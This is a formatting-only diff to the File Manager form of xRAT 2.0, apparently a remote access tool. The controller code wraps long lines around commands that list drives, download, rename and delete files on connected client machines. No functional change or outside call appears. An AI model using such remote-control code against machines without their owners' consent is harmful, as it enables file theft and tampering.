@@ -27,7 +27,8 @@ namespace xRAT_2.Forms
         {
             if (cClient != null)
             {
-                this.Text = string.Format("xRAT 2.0 - File Manager [{0}:{1}]", cClient.EndPoint.Address.ToString(), cClient.EndPoint.Port.ToString());
+                this.Text = string.Format("xRAT 2.0 - File Manager [{0}:{1}]", cClient.EndPoint.Address.ToString(),
+                    cClient.EndPoint.Port.ToString());
                 new Core.Packets.ServerPackets.Drives().Execute(cClient);
             }
         }
@@ -60,7 +61,8 @@ namespace xRAT_2.Forms
             {
                 if (lstDirectory.SelectedItems.Count != 0)
                 {
-                    if (lstDirectory.SelectedItems[0].Tag.ToString() == "dir" && lstDirectory.SelectedItems[0].SubItems[0].Text == "..")
+                    if (lstDirectory.SelectedItems[0].Tag.ToString() == "dir" &&
+                        lstDirectory.SelectedItems[0].SubItems[0].Text == "..")
                     {
                         if (cClient.Value != null)
                         {
@@ -121,12 +123,11 @@ namespace xRAT_2.Forms
 
                                 new Core.Packets.ServerPackets.DownloadFile(path, ID).Execute(cClient);
 
-                                ListViewItem lvi = new ListViewItem(new string[] { ID.ToString(), "Downloading...", files.SubItems[0].Text });
-                                
-                                this.Invoke((MethodInvoker)delegate
-                                {
-                                    lstTransfers.Items.Add(lvi);
-                                });
+                                ListViewItem lvi =
+                                    new ListViewItem(new string[]
+                                    {ID.ToString(), "Downloading...", files.SubItems[0].Text});
+
+                                this.Invoke((MethodInvoker) delegate { lstTransfers.Items.Add(lvi); });
 
                                 Thread.Sleep(50);
                             }
@@ -169,7 +170,8 @@ namespace xRAT_2.Forms
                     else
                         path = path + @"\" + files.SubItems[0].Text;
 
-                    if (InputBox.Show("New name", "Enter new name:", ref newName) == System.Windows.Forms.DialogResult.OK)
+                    if (InputBox.Show("New name", "Enter new name:", ref newName) ==
+                        System.Windows.Forms.DialogResult.OK)
                     {
                         if (currentDir.EndsWith(@"\"))
                             newName = currentDir + newName;
@@ -191,14 +193,16 @@ namespace xRAT_2.Forms
                 {
                     string path = currentDir;
                     bool isDir = files.Tag.ToString() == "dir";
-                    string text = string.Format("Are you sure you want to delete this {0}", (isDir) ? "directory?" : "file?");
+                    string text = string.Format("Are you sure you want to delete this {0}",
+                        (isDir) ? "directory?" : "file?");
 
                     if (path.EndsWith(@"\"))
                         path = path + files.SubItems[0].Text;
                     else
                         path = path + @"\" + files.SubItems[0].Text;
 
-                    if (MessageBox.Show(text, "Are you sure?", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
+                    if (MessageBox.Show(text, "Are you sure?", MessageBoxButtons.YesNo, MessageBoxIcon.Question) ==
+                        DialogResult.Yes)
                     {
                         if (cClient != null)
                             new Core.Packets.ServerPackets.Delete(path, isDir).Execute(cClient);
@@ -218,12 +222,14 @@ namespace xRAT_2.Forms
 
         private void btnOpenDLFolder_Click(object sender, EventArgs e)
         {
-            string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + cClient.EndPoint.Address.ToString());
+            string downloadPath = Path.Combine(Application.StartupPath,
+                "Clients\\" + cClient.EndPoint.Address.ToString());
 
             if (Directory.Exists(downloadPath))
                 Process.Start(downloadPath);
             else
-                MessageBox.Show("No files downloaded yet!", "xRAT 2.0 - File Manager", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                MessageBox.Show("No files downloaded yet!", "xRAT 2.0 - File Manager", MessageBoxButtons.OK,
+                    MessageBoxIcon.Information);
         }
 
         private void lstDirectory_ColumnClick(object sender, ColumnClickEventArgs e)
